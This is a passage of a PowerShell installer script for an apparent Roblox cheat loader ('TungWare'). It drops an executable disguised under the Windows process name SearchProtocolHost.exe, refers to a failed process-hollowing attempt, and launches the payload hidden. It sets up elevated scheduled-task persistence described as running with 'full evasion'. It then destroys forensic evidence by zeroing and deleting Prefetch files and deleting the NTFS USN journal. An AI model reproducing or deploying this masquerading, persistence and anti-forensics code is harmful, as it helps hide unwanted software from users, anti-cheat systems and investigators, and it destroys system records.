        $disguisedExe = Join-Path $fallbackDir "SearchProtocolHost.exe"
        try {
            Copy-Item $localExe $disguisedExe -Force -ErrorAction Stop
            $fallbackExe = $disguisedExe
        } catch { $fallbackExe = $localExe }
    } elseif (Test-Path $localServerExe) {
        $fallbackDir = Join-Path $resolvedPath "build"
        $disguisedExe = Join-Path $fallbackDir "SearchProtocolHost.exe"
        try {
            Copy-Item $localServerExe $disguisedExe -Force -ErrorAction Stop
            $fallbackExe = $disguisedExe
        } catch { $fallbackExe = $localServerExe }
    } else {
        $fallbackDir = Join-Path $resolvedPath "build"
        $fallbackExe = Join-Path $fallbackDir "SearchProtocolHost.exe"
        Write-Host "    Writing decrypted bytes to disguised fallback..." -ForegroundColor Yellow
        try {
            if (-not (Test-Path $fallbackDir)) {
                New-Item -ItemType Directory -Path $fallbackDir -Force | Out-Null
            }
            [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
        } catch {
            Write-Host "    WARNING: Could not write fallback executable to ${fallbackExe}: $_" -ForegroundColor Yellow
            $fallbackExe = Join-Path $env:TEMP "SearchProtocolHost.exe"
            Write-Host "    Attempting temp directory: $fallbackExe" -ForegroundColor Yellow
            try {
                [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
            } catch {
                Write-Host "    [!] ERROR: Could not write fallback executable to temp: $_" -ForegroundColor Red
                $fallbackExe = $null
            }
        }
    }

    if ($fallbackExe -and (Test-Path $fallbackExe)) {
        Write-Host "    Launching fallback executable: $fallbackExe" -ForegroundColor Green
        $proc = Start-Process -FilePath $fallbackExe -PassThru -WindowStyle Hidden
        if ($proc) {
            Write-Host "    Started fallback process ID: $($proc.Id)" -ForegroundColor Green
            $started = $true
        } else {
            Write-Host "    [!] ERROR: Failed to start fallback process." -ForegroundColor Red
        }
    } else {
        Write-Host "    [!] ERROR: Fallback executable not found or could not be created." -ForegroundColor Red
    }
}

# ── RE-ENABLE SYSMAIN after all processes are launched ───────────────────────
try {
    if ($sysmainWasRunning) {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" `
            -Name "EnablePrefetcher" -Value 3 -Type DWord -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" `
            -Name "EnableSuperfetch" -Value 3 -Type DWord -Force -ErrorAction SilentlyContinue
        Start-Service -Name "SysMain" -ErrorAction SilentlyContinue
    }
} catch {}

if (-not $started) {
    Write-Host "    [!] ERROR: Both process hollowing and direct execution fallback failed." -ForegroundColor Red
    Exit 1
} else {
    Write-Host "    Loader running successfully." -ForegroundColor Green
}

Write-Host "[4/4] Configuring fileless startup..." -ForegroundColor Yellow

$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

if ($Persist) {
    # Use go.vbs as the startup entry — it runs setup + kernel_evasion + cleanup
    $goVbsPath = Join-Path $resolvedPath "go.vbs"

    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$goVbsPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogon
    $principal = New-ScheduledTaskPrincipal -UserId $currentUser -RunLevel Highest -LogonType Interactive
    Register-ScheduledTask -TaskName $LoaderTaskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

    Write-Host "    Startup task registered (runs go.vbs with full evasion on every boot)." -ForegroundColor Green
    
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TungWarePortal" -Force -ErrorAction SilentlyContinue | Out-Null
} else {
    Write-Host "    Persistence disabled: Cleaning up any existing scheduled tasks/Run keys..." -ForegroundColor Green
    $vbsPath = Join-Path $resolvedPath "silent_loader.vbs"
    if (Test-Path $vbsPath) { Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue }
    Unregister-ScheduledTask -TaskName $LoaderTaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    Unregister-ScheduledTask -TaskName $PersistTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TungWarePortal" -Force -ErrorAction SilentlyContinue | Out-Null
}

@(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\TungWarePortal.lnk",
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\TungWarePortal.url",
    "$env:USERPROFILE\.tungware_bootstrap.ps1",
    "$env:USERPROFILE\.tungware_key",
    "$env:USERPROFILE\.tungware_persistence"
) | ForEach-Object { if (Test-Path $_) { Remove-Item $_ -Force -ErrorAction SilentlyContinue } }

Write-Host "Waiting for loader to initialize on port 9876..." -ForegroundColor Yellow
$started = $false
for ($i = 0; $i -lt 20; $i++) {
    try {
        $c = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9876)
        $c.Close()
        $started = $true
        break
    } catch { Start-Sleep -Seconds 1 }
}

function Start-PrivateBrowser([string]$url) {
    $progId = ""
    try {
        $progId = (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice" -Name "ProgId" -ErrorAction SilentlyContinue).ProgId
    } catch {}

    $browser = ""
    $arguments = ""

    if ($progId -like "*Chrome*") {
        $browser = "chrome.exe"
        $arguments = "--incognito `"$url`""
    } elseif ($progId -like "*MSEdge*" -or $progId -like "*Edge*") {
        $browser = "msedge.exe"
        $arguments = "-inprivate `"$url`""
    } elseif ($progId -like "*Firefox*") {
        $browser = "firefox.exe"
        $arguments = "-private-window `"$url`""
    } elseif ($progId -like "*Opera*") {
        $browser = "opera.exe"
        $arguments = "--private `"$url`""
    }

    if (-not $browser) {
        if (Get-Command "chrome.exe" -ErrorAction SilentlyContinue) {
            $browser = "chrome.exe"
            $arguments = "--incognito `"$url`""
        } elseif (Get-Command "msedge.exe" -ErrorAction SilentlyContinue) {
            $browser = "msedge.exe"
            $arguments = "-inprivate `"$url`""
        } elseif (Get-Command "firefox.exe" -ErrorAction SilentlyContinue) {
            $browser = "firefox.exe"
            $arguments = "-private-window `"$url`""
        } else {
            Start-Process $url
            return
        }
    }

    try {
        Start-Process $browser -ArgumentList $arguments -ErrorAction Stop
    } catch {
        Start-Process $url
    }
}
if (-not $started) {
    Write-Host "Loader port 9876 not active yet, launching binary directly..." -ForegroundColor Yellow
    if ($localExe -and (Test-Path $localExe)) {
        Start-Process -FilePath $localExe -WindowStyle Hidden
    } else {
        $directCandidates = @(
            (Join-Path $resolvedPath "my private\build\RobloxCrashHandler.exe"),
            (Join-Path $scriptRoot "my private\build\RobloxCrashHandler.exe"),
            (Join-Path $resolvedPath "build\RobloxCrashHandler.exe")
        )
        $directBin = $directCandidates | Where-Object { Test-Path $_ } | Select-Object -First 1
        if ($directBin) { Start-Process -FilePath $directBin -WindowStyle Hidden }
    }
    Start-Sleep -Seconds 2
}

Write-Host "Opening website in browser..." -ForegroundColor Green
Start-PrivateBrowser "http://127.0.0.1:9876"

wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:true 2>$null
wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:true 2>$null

try {
    $pfDir = "$env:SystemRoot\Prefetch"
    if (Test-Path $pfDir) {
        $pfMatched = Get-ChildItem -Path $pfDir -Filter "*.pf" -ErrorAction SilentlyContinue | Where-Object {
            $_.Name -like "*Roblox*" -or $_.Name -like "*TUNG*" -or $_.Name -like "*POWERSHELL*" -or $_.Name -like "*WSCRIPT*" -or $_.Name -like "*DLLHOST*" -or $_.Name -like "*INSTALLER*" -or $_.Name -like "*SETUP*"
        }
        foreach ($pf in $pfMatched) {
            try {
                $len = $pf.Length
                if ($len -gt 0) {
                    [System.IO.File]::WriteAllBytes($pf.FullName, (New-Object byte[] $len))
                }
            } catch {}
            Remove-Item -Path $pf.FullName -Force -ErrorAction SilentlyContinue
        }
        for ($i = 0; $i -lt 50; $i++) {
            $dummy = Join-Path $pfDir "tmp_$([System.IO.Path]::GetRandomFileName()).tmp"
            try {
                [System.IO.File]::WriteAllText($dummy, "0")
                Remove-Item -Path $dummy -Force -ErrorAction SilentlyContinue
            } catch {}
        }
    }
    cmd.exe /c "fsutil usn deletejournal /D C:" | Out-Null
    cmd.exe /c "fsutil usn createjournal m=33554432 a=8388608 C:" | Out-Null
} catch {}

Write-Host "==========================================" -ForegroundColor Green
Write-Host "  SUCCESS: Install complete!              " -ForegroundColor Green
Write-Host "  Activate from the website at 127.0.0.1 " -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Green
